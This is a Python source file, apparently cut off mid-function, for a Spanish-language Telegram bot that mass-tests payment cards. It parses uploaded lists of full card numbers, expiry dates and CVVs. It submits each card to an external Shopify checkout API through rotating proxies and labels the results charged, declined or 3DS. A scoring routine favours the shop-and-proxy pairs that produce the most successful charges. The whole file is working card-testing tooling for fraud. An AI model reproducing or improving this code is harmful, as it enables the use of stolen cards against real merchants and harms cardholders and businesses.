# -*- coding: utf-8 -*-
"""
Bot de Telegram para verificar tarjetas - VERSIÓN PROFESIONAL ULTRA
Con barra de progreso en tiempo real, detección INTELIGENTE de archivos,
validación real de tarjetas, aprendizaje con decay, rate limiting y manejo de mensajes largos.
"""

import os
import json
import logging
import asyncio
import time
import random
import sqlite3
import re
from collections import deque, defaultdict
from typing import Dict, List, Tuple, Optional, Any
from datetime import datetime, timedelta
from contextlib import asynccontextmanager
import math
from dataclasses import dataclass, field
from enum import Enum

from telegram import Update, Document
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import aiohttp

# ================== CONFIGURACIÓN SEGURA ==================
TOKEN = os.environ.get("BOT_TOKEN")
if not TOKEN:
    raise ValueError("❌ ERROR: BOT_TOKEN no está configurado. Debes añadirlo en las variables de entorno.")

API_URL = os.environ.get("API_URL", "https://auto-shopify-api-production.up.railway.app/index.php")
DB_FILE = os.environ.get("DB_FILE", "bot_database.db")
MAX_WORKERS_PER_USER = int(os.environ.get("MAX_WORKERS", 10))
RATE_LIMIT_SECONDS = int(os.environ.get("RATE_LIMIT", 2))
DAILY_LIMIT_CHECKS = int(os.environ.get("DAILY_LIMIT", 1000))

# Diccionario para controlar cancelación
cancel_mass = {}

# Logging profesional
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ================== FUNCIÓN PARA BARRA DE PROGRESO ==================
def create_progress_bar(current: int, total: int, width: int = 20) -> str:
    """Crea una barra de progreso visual"""
    if total == 0:
        return "[" + "░" * width + "]"
    filled = int((current / total) * width)
    bar = "█" * filled + "░" * (width - filled)
    return f"[{bar}]"

# ================== ENUMS Y DATACLASSES ==================
class CheckStatus(Enum):
    CHARGED = "charged"
    DECLINED = "declined"
    TIMEOUT = "timeout"
    ERROR = "error"
    CAPTCHA = "captcha"
    INSUFFICIENT_FUNDS = "insufficient_funds"
    THREE_DS = "3ds"

@dataclass
class CheckResult:
    """Resultado de una verificación"""
    card_bin: str
    card_last4: str
    site: str
    proxy: str
    status: CheckStatus
    response_time: float
    http_code: Optional[int]
    response_text: str
    error: Optional[str] = None
    success: bool = False
    
    @property
    def penalty(self) -> float:
        """Penalización según tipo de error"""
        if self.success:
            return 0.0
        if self.status == CheckStatus.TIMEOUT:
            return 2.0
        if self.status == CheckStatus.ERROR:
            return 1.5
        if self.status == CheckStatus.DECLINED:
            return 0.5
        if self.status == CheckStatus.CAPTCHA:
            return 1.0
        return 1.0

@dataclass
class UserRateLimit:
    last_command: datetime = field(default_factory=datetime.now)
    checks_today: int = 0
    workers_active: int = 0
    tasks: Dict[str, asyncio.Task] = field(default_factory=dict)

# ================== VALIDACIÓN DE TARJETAS ==================
class CardValidator:
    @staticmethod
    def luhn_check(card_number: str) -> bool:
        """Implementación del algoritmo de Luhn"""
        def digits_of(n):
            return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10 == 0

    @staticmethod
    def validate_expiry(month: str, year: str) -> bool:
        """Valida que la fecha no esté vencida"""
        try:
            exp_month = int(month)
            exp_year = int(year)
            if len(year) == 2:
                exp_year += 2000
            
            now = datetime.now()
            current_year = now.year
            current_month = now.month
            
            if exp_year < current_year:
                return False
            if exp_year == current_year and exp_month < current_month:
                return False
            return True
        except Exception as e:
            logger.error(f"Error validando fecha: {e}")
            return False

    @staticmethod
    def validate_cvv(cvv: str) -> bool:
        """Valida formato de CVV (3 o 4 dígitos)"""
        return cvv.isdigit() and len(cvv) in (3, 4)

    @staticmethod
    def parse_card(card_str: str) -> Optional[Dict]:
        """Parsea string de tarjeta y valida todo"""
        parts = card_str.split('|')
        if len(parts) != 4:
            return None
        
        number, month, year, cvv = parts
        
        if not number.isdigit() or len(number) < 13 or len(number) > 19:
            return None
        if not CardValidator.luhn_check(number):
            return None
        if not CardValidator.validate_expiry(month, year):
            return None
        if not CardValidator.validate_cvv(cvv):
            return None
            
        return {
            "number": number,
            "month": month,
            "year": year,
            "cvv": cvv,
            "bin": number[:6],
            "last4": number[-4:]
        }

# ================== DETECCIÓN INTELIGENTE DE ARCHIVOS ==================
def detect_line_type(line: str) -> Tuple[str, Optional[str]]:
    """
    Detección INTELIGENTE de tipo de línea.
    Analiza el contenido REAL, no solo el formato superficial.
    """
    line = line.strip()
    if not line:
        return None, None

    # ===== 1. DETECTAR SITIOS (URLs) =====
    if line.startswith(('http://', 'https://')):
        rest = line.split('://')[1]
        if '.' in rest and not rest.startswith('.') and ' ' not in rest:
            return 'site', line

    # ===== 2. DETECTAR TARJETAS =====
    if '|' in line:
        parts = line.split('|')
        if len(parts) == 4:
            numero, mes, año, cvv = parts
            if (numero.isdigit() and len(numero) >= 13 and len(numero) <= 19 and
                mes.isdigit() and 1 <= int(mes) <= 12 and
                año.isdigit() and len(año) in (2, 4) and
                cvv.isdigit() and len(cvv) in (3, 4)):
                if CardValidator.luhn_check(numero):
                    return 'card', line

    # ===== 3. DETECTAR PROXIES =====
    if not line.startswith(('http://', 'https://')):
        parts = line.split(':')
        
        if len(parts) == 2:
            host, port = parts
            if port.isdigit() and 1 <= int(port) <= 65535:
                if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
                    return 'proxy', line
        
        elif len(parts) == 4:
            host, port, user, password = parts
            if port.isdigit() and 1 <= int(port) <= 65535:
                if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
                    return 'proxy', line
        
        elif len(parts) == 3 and parts[2] == '':
            host, port, _ = parts
            if port.isdigit() and 1 <= int(port) <= 65535:
                if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
                    return 'proxy', line

    return None, None

# ================== BASE DE DATOS OPTIMIZADA ==================
class Database:
    def __init__(self, db_path=DB_FILE):
        self.db_path = db_path
        self._write_lock = asyncio.Lock()
        self._batch_queue = []
        self._batch_lock = asyncio.Lock()
        self._batch_task = None
        self._initialized = False
        
    def _init_db_sync(self):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("PRAGMA journal_mode=WAL")
            conn.execute("PRAGMA synchronous=NORMAL")
            conn.execute("PRAGMA cache_size=10000")
            
            cursor = conn.cursor()
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    sites TEXT DEFAULT '[]',
                    proxies TEXT DEFAULT '[]',
                    cards TEXT DEFAULT '[]',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS learning (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    site TEXT,
                    proxy TEXT,
                    attempts INTEGER DEFAULT 0,
                    successes INTEGER DEFAULT 0,
                    timeouts INTEGER DEFAULT 0,
                    declines INTEGER DEFAULT 0,
                    charged INTEGER DEFAULT 0,
                    total_time REAL DEFAULT 0,
                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    UNIQUE(user_id, site, proxy)
                )
            ''')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_learning_user ON learning(user_id)')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    card_bin TEXT,
                    card_last4 TEXT,
                    site TEXT,
                    proxy TEXT,
                    status TEXT,
                    response_time REAL,
                    http_code INTEGER,
                    response_text TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_results_user ON results(user_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_results_date ON results(created_at)')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS rate_limits (
                    user_id INTEGER PRIMARY KEY,
                    last_command TIMESTAMP,
                    checks_today INTEGER DEFAULT 0,
                    last_reset DATE DEFAULT CURRENT_DATE
                )
            ''')
            
            conn.commit()

    async def initialize(self):
        if self._initialized:
            return
        
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, self._init_db_sync)
        
        self._batch_task = asyncio.create_task(self._batch_processor())
        self._initialized = True
        logger.info("✅ Base de datos inicializada")

    async def _batch_processor(self):
        while True:
            try:
                await asyncio.sleep(5)
                if self._batch_queue:
                    async with self._batch_lock:
                        batch = self._batch_queue.copy()
                        self._batch_queue.clear()
                    
                    async with self._write_lock:
                        await self._execute_batch(batch)
            except asyncio.CancelledError:
                if self._batch_queue:
                    async with self._batch_lock:
                        batch = self._batch_queue.copy()
                        self._batch_queue.clear()
                    if batch:
                        await self._execute_batch(batch)
                break
            except Exception as e:
                logger.error(f"Error en batch processor: {e}")

    async def _execute_batch(self, batch: List[tuple]):
        try:
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, self._sync_execute_batch, batch)
        except Exception as e:
            logger.error(f"Error en batch insert: {e}")

    def _sync_execute_batch(self, batch: List[tuple]):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.executemany(
                """INSERT INTO results 
                   (user_id, card_bin, card_last4, site, proxy, status, 
                    response_time, http_code, response_text)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                batch
            )
            conn.commit()

    async def queue_result(self, user_id: int, result: CheckResult):
        if not self._initialized:
            await self.initialize()
        async with self._batch_lock:
            self._batch_queue.append((
                user_id, result.card_bin, result.card_last4, 
                result.site, result.proxy, result.status.value,
                result.response_time, result.http_code, result.response_text[:200]
            ))

    async def execute(self, query: str, params: tuple = ()):
        if not self._initialized:
            await self.initialize()
        async with self._write_lock:
            loop = asyncio.get_event_loop()
            return await loop.run_in_executor(
                None, lambda: self._sync_execute(query, params)
            )

    def _sync_execute(self, query: str, params: tuple):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(query, params)
            conn.commit()
            return cursor

    async def fetch_one(self, query: str, params: tuple = ()):
        if not self._initialized:
            await self.initialize()
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(
            None, lambda: self._sync_fetch_one(query, params)
        )

    def _sync_fetch_one(self, query: str, params: tuple):
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute(query, params)
            row = cursor.fetchone()
            return dict(row) if row else None

    async def fetch_all(self, query: str, params: tuple = ()):
        if not self._initialized:
            await self.initialize()
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(
            None, lambda: self._sync_fetch_all(query, params)
        )

    def _sync_fetch_all(self, query: str, params: tuple):
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute(query, params)
            return [dict(row) for row in cursor.fetchall()]

    async def cleanup_old_results(self, days: int = 7):
        if not self._initialized:
            await self.initialize()
        await self.execute(
            "DELETE FROM results WHERE created_at < date('now', ?)",
            (f"-{days} days",)
        )

    async def shutdown(self):
        if self._batch_task:
            self._batch_task.cancel()
            try:
                await self._batch_task
            except asyncio.CancelledError:
                pass

# ================== SISTEMA DE APRENDIZAJE CON DECAY ==================
class LearningSystem:
    def __init__(self, db: Database, user_id: int):
        self.db = db
        self.user_id = user_id
        self.EPSILON = 0.1
        self.DECAY_LAMBDA = 0.01
        self._score_cache = {}
        self._cache_time = {}

    async def update(self, result: CheckResult):
        site = result.site
        proxy = result.proxy
        elapsed = result.response_time
        
        existing = await self.db.fetch_one(
            "SELECT * FROM learning WHERE user_id = ? AND site = ? AND proxy = ?",
            (self.user_id, site, proxy)
        )
        
        if existing:
            days_old = (datetime.now() - datetime.fromisoformat(existing["last_seen"])).days
            decay = math.exp(-self.DECAY_LAMBDA * days_old) if days_old > 0 else 1.0
            
            attempts = int(existing["attempts"] * decay) + 1
            successes = int(existing["successes"] * decay) + (1 if result.success else 0)
            timeouts = int(existing["timeouts"] * decay) + (1 if result.status == CheckStatus.TIMEOUT else 0)
            declines = int(existing["declines"] * decay) + (1 if result.status == CheckStatus.DECLINED else 0)
            charged = int(existing["charged"] * decay) + (1 if result.status == CheckStatus.CHARGED else 0)
            total_time = existing["total_time"] * decay + elapsed
            
            await self.db.execute(
                """UPDATE learning SET 
                   attempts = ?, successes = ?, timeouts = ?, declines = ?,
                   charged = ?, total_time = ?, last_seen = CURRENT_TIMESTAMP
                   WHERE id = ?""",
                (attempts, successes, timeouts, declines, charged, total_time, existing["id"])
            )
        else:
            await self.db.execute(
                """INSERT INTO learning 
                   (user_id, site, proxy, attempts, successes, timeouts, declines, charged, total_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (self.user_id, site, proxy, 1, 1 if result.success else 0,
                 1 if result.status == CheckStatus.TIMEOUT else 0,
                 1 if result.status == CheckStatus.DECLINED else 0,
                 1 if result.status == CheckStatus.CHARGED else 0, elapsed)
            )
        
        self._score_cache.pop(f"{site}|{proxy}", None)

    async def get_score(self, site: str, proxy: str) -> float:
        cache_key = f"{site}|{proxy}"
        
        if cache_key in self._score_cache:
            cache_time, score = self._score_cache[cache_key]
            if (datetime.now() - cache_time).seconds < 300:
                return score
        
        row = await self.db.fetch_one(
            "SELECT * FROM learning WHERE user_id = ? AND site = ? AND proxy = ?",
            (self.user_id, site, proxy)
        )
        
        if not row or row["attempts"] < 3:
            return 0.5
        
        attempts = row["attempts"]
        charged = row["charged"]
        timeouts = row["timeouts"]
        declines = row["declines"]
        avg_time = row["total_time"] / attempts if attempts > 0 else 1.0
        
        success_rate = charged / attempts
        timeout_penalty = 0.5 * (timeouts / attempts)
        decline_penalty = 0.2 * (declines / attempts)
        speed_score = 1.0 / (avg_time + 0.5)
        
        score = success_rate * 2.0 - timeout_penalty - decline_penalty + speed_score
        score = max(0.1, min(2.0, score))
        
        self._score_cache[cache_key] = (datetime.now(), score)
        return score

    async def choose_combination(self, sites: List[str], proxies: List[str]) -> Tuple[str, str]:
        if random.random() < self.EPSILON:
            return random.choice(sites), random.choice(proxies)
        
        scores = []
        for site in sites:
            for proxy in proxies:
                score = await self.get_score(site, proxy)
                scores.append((score, site, proxy))
        
        scores.sort(reverse=True)
        return scores[0][1], scores[0][2]

# ================== CHECKER ULTRA OPTIMIZADO ==================
class UltraFastChecker:
    def __init__(self):
        self.connector = None
        self.session_pool = deque(maxlen=30)
        self._initialized = False
        self._cleanup_task = None
        self._active_requests = 0
        self._request_lock = asyncio.Lock()

    async def initialize(self):
        if self._initialized:
            return
        self.connector = aiohttp.TCPConnector(
            limit=200,
            limit_per_host=50,
            ttl_dns_cache=300,
            force_close=False,
            enable_cleanup_closed=True
        )
        await self._create_sessions()
        self._cleanup_task = asyncio.create_task(self._cleanup_loop())
        self._initialized = True

    async def _create_sessions(self):
        for _ in range(30):
            session = aiohttp.ClientSession(
                connector=self.connector,
                timeout=aiohttp.ClientTimeout(total=20, sock_read=10)
            )
            self.session_pool.append(session)

    async def _cleanup_loop(self):
        while self._initialized:
            await asyncio.sleep(60)
            valid_sessions = deque(maxlen=30)
            while self.session_pool:
                s = self.session_pool.popleft()
                if not s.closed:
                    valid_sessions.append(s)
                else:
                    try:
                        await s.close()
                    except:
                        pass
            self.session_pool = valid_sessions

    async def get_session(self):
        if not self._initialized:
            await self.initialize()
        if not self.session_pool:
            return aiohttp.ClientSession(connector=self.connector)
        return self.session_pool.popleft()

    async def return_session(self, session):
        if not session.closed:
            self.session_pool.append(session)

    async def shutdown(self):
        self._initialized = False
        if self._cleanup_task:
            self._cleanup_task.cancel()
            try:
                await self._cleanup_task
            except asyncio.CancelledError:
                pass
        while self.session_pool:
            s = self.session_pool.popleft()
            try:
                await s.close()
            except:
                pass
        if self.connector:
            await self.connector.close()

    async def check_card(self, site: str, proxy: str, card_data: Dict) -> CheckResult:
        card_str = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
        params = {"site": site, "cc": card_str, "proxy": proxy}
        
        async with self._request_lock:
            self._active_requests += 1
        
        session = await self.get_session()
        start_time = time.time()
        
        try:
            max_retries = 3
            for attempt in range(max_retries):
                try:
                    async with session.get(API_URL, params=params) as resp:
                        elapsed = time.time() - start_time
                        response_text = await resp.text()
                        
                        status = CheckStatus.ERROR
                        success = False
                        
                        if resp.status >= 500:
                            if attempt < max_retries - 1:
                                await asyncio.sleep(1 * (attempt + 1))
                                continue
                            status = CheckStatus.ERROR
                        elif resp.status >= 400:
                            status = CheckStatus.DECLINED
                        else:
                            if "Thank You" in response_text or "CHARGED" in response_text:
                                status = CheckStatus.CHARGED
                                success = True
                            elif "3DS" in response_text or "3D_AUTHENTICATION" in response_text:
                                status = CheckStatus.THREE_DS
                            elif "CAPTCHA" in response_text:
                                status = CheckStatus.CAPTCHA
                            elif "INSUFFICIENT_FUNDS" in response_text:
                                status = CheckStatus.INSUFFICIENT_FUNDS
                            elif "DECLINE" in response_text:
                                status = CheckStatus.DECLINED
                        
                        return CheckResult(
                            card_bin=card_data["bin"],
                            card_last4=card_data["last4"],
                            site=site,
                            proxy=proxy,
                            status=status,
                            response_time=elapsed,
                            http_code=resp.status,
                            response_text=response_text,
                            success=success
                        )
                        
                except asyncio.TimeoutError:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(1)
                        continue
                    elapsed = time.time() - start_time
                    return CheckResult(
                        card_bin=card_data["bin"],
                        card_last4=card_data["last4"],
                        site=site,
                        proxy=proxy,
                        status=CheckStatus.TIMEOUT,
                        response_time=elapsed,
                        http_code=None,
                        response_text="",
                        error="Timeout",
                        success=False
                    )
                except aiohttp.ClientError as e:
                    if attempt < max_retries - 1:
                        await asyncio.sleep(1)
                        continue
                    elapsed = time.time() - start_time
                    return CheckResult(
                        card_bin=card_data["bin"],
                        card_last4=card_data["last4"],
                        site=site,
                        proxy=proxy,
                        status=CheckStatus.ERROR,
                        response_time=elapsed,
                        http_code=None,
                        response_text="",
                        error=str(e),
                        success=False
                    )
                except Exception as e:
                    logger.error(f"Error inesperado: {e}", exc_info=True)
                    elapsed = time.time() - start_time
                    return CheckResult(
                        card_bin=card_data["bin"],
                        card_last4=card_data["last4"],
                        site=site,
                        proxy=proxy,
                        status=CheckStatus.ERROR,
                        response_time=elapsed,
                        http_code=None,
                        response_text="",
                        error=f"Unexpected: {str(e)}",
                        success=False
                    )
        finally:
            await self.return_session(session)
            async with self._request_lock:
                self._active_requests -= 1

# ================== GESTIÓN DE USUARIOS Y RATE LIMIT ==================
class UserManager:
    def __init__(self, db: Database):
        self.db = db
        self.rate_limits: Dict[int, UserRateLimit] = {}
        self._command_locks: Dict[int, asyncio.Lock] = defaultdict(asyncio.Lock)

    async def check_rate_limit(self, user_id: int) -> Tuple[bool, str]:
        today = datetime.now().date()
        
        row = await self.db.fetch_one(
            "SELECT * FROM rate_limits WHERE user_id = ?",
            (user_id,)
        )
        
        if not row:
            await self.db.execute(
                "INSERT INTO rate_limits (user_id, last_command, checks_today, last_reset) VALUES (?, ?, ?, ?)",
                (user_id, datetime.now(), 0, today)
            )
            return True, ""
        
        last_reset = datetime.fromisoformat(row["last_reset"]).date()
        if last_reset < today:
            await self.db.execute(
                "UPDATE rate_limits SET checks_today = 0, last_reset = ? WHERE user_id = ?",
                (today, user_id)
            )
            checks_today = 0
        else:
            checks_today = row["checks_today"]
        
        if checks_today >= DAILY_LIMIT_CHECKS:
            return False, f"Límite diario alcanzado ({DAILY_LIMIT_CHECKS} verificaciones)"
        
        last_command = datetime.fromisoformat(row["last_command"])
        seconds_since = (datetime.now() - last_command).seconds
        if seconds_since < RATE_LIMIT_SECONDS:
            return False, f"Espera {RATE_LIMIT_SECONDS - seconds_since}s"
        
        return True, ""

    async def increment_checks(self, user_id: int):
        await self.db.execute(
            "UPDATE rate_limits SET checks_today = checks_today + 1, last_command = ? WHERE user_id = ?",
            (datetime.now(), user_id)
        )

    async def get_user_data(self, user_id: int) -> Dict:
        row = await self.db.fetch_one(
            "SELECT sites, proxies, cards FROM users WHERE user_id = ?",
            (user_id,)
        )
        
        if not row:
            await self.db.execute(
                "INSERT INTO users (user_id, sites, proxies, cards) VALUES (?, ?, ?, ?)",
                (user_id, '[]', '[]', '[]')
            )
            return {"sites": [], "proxies": [], "cards": []}
        
        return {
            "sites": json.loads(row["sites"]),
            "proxies": json.loads(row["proxies"]),
            "cards": json.loads(row["cards"])
        }

    async def update_user_data(self, user_id: int, sites=None, proxies=None, cards=None):
        current = await self.get_user_data(user_id)
        
        if sites is not None:
            current["sites"] = sites
        if proxies is not None:
            current["proxies"] = proxies
        if cards is not None:
            current["cards"] = cards
        
        await self.db.execute(
            """UPDATE users SET 
               sites = ?, proxies = ?, cards = ? 
               WHERE user_id = ?""",
            (json.dumps(current["sites"]), 
             json.dumps(current["proxies"]), 
             json.dumps(current["cards"]), 
             user_id)
        )

    async def register_task(self, user_id: int, task_id: str, task: asyncio.Task):
        if user_id not in self.rate_limits:
            self.rate_limits[user_id] = UserRateLimit()
        self.rate_limits[user_id].tasks[task_id] = task

    async def cancel_user_tasks(self, user_id: int):
        if user_id in self.rate_limits:
            for task_id, task in self.rate_limits[user_id].tasks.items():
                if not task.done():
                    task.cancel()
            self.rate_limits[user_id].tasks.clear()

# ================== SERVICIOS (LÓGICA DE NEGOCIO) ==================
class CardCheckService:
    def __init__(self, db: Database, user_manager: UserManager, checker: UltraFastChecker):
        self.db = db
        self.user_manager = user_manager
        self.checker = checker

    async def check_single(self, user_id: int, card_data: Dict, site: str, proxy: str) -> CheckResult:
        result = await self.checker.check_card(site, proxy, card_data)
        
        await self.db.queue_result(user_id, result)
        
        learning = LearningSystem(self.db, user_id)
        await learning.update(result)
        
        await self.user_manager.increment_checks(user_id)
        
        return result

    async def check_mass(
        self, 
        user_id: int,
        cards: List[Dict],
        sites: List[str],
        proxies: List[str],
        num_workers: int,
        progress_callback=None
    ) -> Tuple[List[CheckResult], int, float]:
        queue = asyncio.Queue()
        for card in cards:
            await queue.put(card)
        
        results = []
        processed = 0
        success_count = 0
        start_time = time.time()
        
        learning = LearningSystem(self.db, user_id)
        
        async def worker(worker_id: int):
            nonlocal processed, success_count
            worker_processed = 0
            worker_success = 0
            
            while not queue.empty() and not cancel_mass.get(user_id, False):
                try:
                    card_data = await asyncio.wait_for(queue.get(), timeout=1.0)
                except asyncio.TimeoutError:
                    break
                
                site, proxy = await learning.choose_combination(sites, proxies)
                
                result = await self.checker.check_card(site, proxy, card_data)
                
                worker_processed += 1
                if result.success:
                    worker_success += 1
                
                results.append(result)
                await learning.update(result)
                await self.db.queue_result(user_id, result)
                
                processed += 1
                if result.success:
                    success_count += 1
                
                if progress_callback:
                    await progress_callback(processed, success_count, len(cards))
            
            return worker_processed, worker_success
        
        tasks = []
        for i in range(num_workers):
            task = asyncio.create_task(worker(i))
            tasks.append(task)
            await self.user_manager.register_task(user_id, f"worker_{i}", task)
        
        try:
            await asyncio.wait_for(asyncio.gather(*tasks), timeout=300)
        except asyncio.TimeoutError:
            logger.warning(f"Mass check timeout para usuario {user_id}")
            for task in tasks:
                if not task.done():
                    task.cancel()
        except asyncio.CancelledError:
            pass
        
        elapsed = time.time() - start_time
        return results, success_count, elapsed

# ================== HANDLERS DE TELEGRAM ==================
db = None
user_manager = None
checker = None
card_service = None

# Comandos
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    texto = (
        "🤖 *Bot Checker Profesional Ultra*\n\n"
        "✅ Detección INTELIGENTE de archivos\n"
        "✅ Validación Luhn + fecha + CVV\n"
        "🧠 Aprendizaje con decaimiento exponencial\n"
        "⚡ Ultra rápido (200 conexiones)\n"
        "🔒 Rate limiting por usuario\n"
        "📊 SQLite con batch inserts\n"
        "📈 Barra de progreso en tiempo real\n\n"
        "Comandos:\n"
        "• `/addsite <url>` – Guardar tienda\n"
        "• `/addproxy <host:port>` – Guardar proxy\n"
        "• `/sites` – Listar sitios\n"
        "• `/proxies` – Listar proxies\n"
        "• `/cards` – Listar tarjetas válidas\n"
        "• `/check <cc>` – Verificar una\n"
        "• `/mass [workers]` – Masivo con barra de progreso\n"
        "• `/learn` – Ver aprendizaje\n"
        "• `/stats` – Estadísticas\n"
        "• `/stop` – Detener proceso\n"
        "• `/reset_learn` – Reiniciar aprendizaje\n"
        "• *Envía un .txt* con datos (detección automática)"
    )
    await update.message.reply_text(texto, parse_mode="Markdown")

async def addsite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Uso: `/addsite <url>`", parse_mode="Markdown")
        return
    url = context.args[0].strip()
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    user_data["sites"].append(url)
    await user_manager.update_user_data(user_id, sites=user_data["sites"])
    await update.message.reply_text(f"✅ Sitio guardado:\n{url}")

async def addproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Uso: `/addproxy <host:port>`", parse_mode="Markdown")
        return

    proxy_input = context.args[0].strip()
    colon_count = proxy_input.count(':')

    if colon_count == 1:
        proxy = f"{proxy_input}::"
    elif colon_count == 3:
        proxy = proxy_input
    else:
        await update.message.reply_text("❌ Formato incorrecto")
        return

    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    user_data["proxies"].append(proxy)
    await user_manager.update_user_data(user_id, proxies=user_data["proxies"])
    await update.message.reply_text(f"✅ Proxy guardado:\n`{proxy}`", parse_mode="Markdown")

async def listsites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    sites = user_data["sites"]
    if not sites:
        await update.message.reply_text("📭 No tienes sitios guardados.")
        return
    
    if len(sites) > 20:
        muestra = sites[:20]
        lines = [f"{i+1}. {site}" for i, site in enumerate(muestra)]
        lines.append(f"... y {len(sites)-20} sitios más.")
    else:
        lines = [f"{i+1}. {site}" for i, site in enumerate(sites)]
    
    message = "📌 *Sitios:*\n" + "\n".join(lines)
    
    if len(message) > 4000:
        filename = f"sites_{user_id}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("\n".join([f"{i+1}. {site}" for i, site in enumerate(sites)]))
        await update.message.reply_document(
            document=open(filename, "rb"),
            filename=filename,
            caption="📌 *Lista completa de sitios*",
            parse_mode="Markdown"
        )
        os.remove(filename)
    else:
        await update.message.reply_text(message, parse_mode="Markdown")

async def listproxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    proxies = user_data["proxies"]
    if not proxies:
        await update.message.reply_text("📭 No tienes proxies guardados.")
        return
    
    if len(proxies) > 20:
        muestra = proxies[:20]
        lines = [f"{i+1}. `{proxy}`" for i, proxy in enumerate(muestra)]
        lines.append(f"... y {len(proxies)-20} proxies más.")
    else:
        lines = [f"{i+1}. `{proxy}`" for i, proxy in enumerate(proxies)]
    
    message = "📌 *Proxies:*\n" + "\n".join(lines)
    
    if len(message) > 4000:
        filename = f"proxies_{user_id}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("\n".join([f"{i+1}. {proxy}" for i, proxy in enumerate(proxies)]))
        await update.message.reply_document(
            document=open(filename, "rb"),
            filename=filename,
            caption="📌 *Lista completa de proxies*",
            parse_mode="Markdown"
        )
        os.remove(filename)
    else:
        await update.message.reply_text(message, parse_mode="Markdown")

async def listcards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    cards = user_data["cards"]
    if not cards:
        await update.message.reply_text("📭 No tienes tarjetas válidas cargadas.")
        return
    
    if len(cards) > 20:
        muestra = cards[:20]
        lines = [f"{i+1}. `{card}`" for i, card in enumerate(muestra)]
        lines.append(f"... y {len(cards)-20} tarjetas más.")
    else:
        lines = [f"{i+1}. `{card}`" for i, card in enumerate(cards)]
    
    message = "📌 *Tarjetas:*\n" + "\n".join(lines)
    
    if len(message) > 4000:
        filename = f"cards_{user_id}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("\n".join([f"{i+1}. {card}" for i, card in enumerate(cards)]))
        await update.message.reply_document(
            document=open(filename, "rb"),
            filename=filename,
            caption="📌 *Lista completa de tarjetas*",
            parse_mode="Markdown"
        )
        os.remove(filename)
    else:
        await update.message.reply_text(message, parse_mode="Markdown")

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text("❌ Uso: `/check <cc>`", parse_mode="Markdown")
        return

    card_str = context.args[0]
    card_data = CardValidator.parse_card(card_str)
    if not card_data:
        await update.message.reply_text("❌ Tarjeta inválida (Luhn, fecha o CVV incorrecto)")
        return

    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    sites = user_data["sites"]
    proxies = user_data["proxies"]

    if not sites or not proxies:
        await update.message.reply_text("❌ Faltan sitios o proxies.")
        return

    learning = LearningSystem(db, user_id)
    site, proxy = await learning.choose_combination(sites, proxies)

    msg = await update.message.reply_text("⏳ Verificando...")
    result = await card_service.check_single(user_id, card_data, site, proxy)

    icon = "✅" if result.success else "❌"
    await msg.edit_text(
        f"{icon} *Resultado*\n"
        f"• BIN: `{card_data['bin']}`\n"
        f"• Estado: `{result.status.value}`\n"
        f"• Tiempo: `{result.response_time:.2f}s`\n"
        f"• Sitio: `{site[:50]}...`\n"
        f"• Respuesta: `{result.response_text[:100]}`",
        parse_mode="Markdown"
    )

async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Verificación masiva con barra de progreso en tiempo real"""
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    
    valid_cards = []
    for card_str in user_data["cards"]:
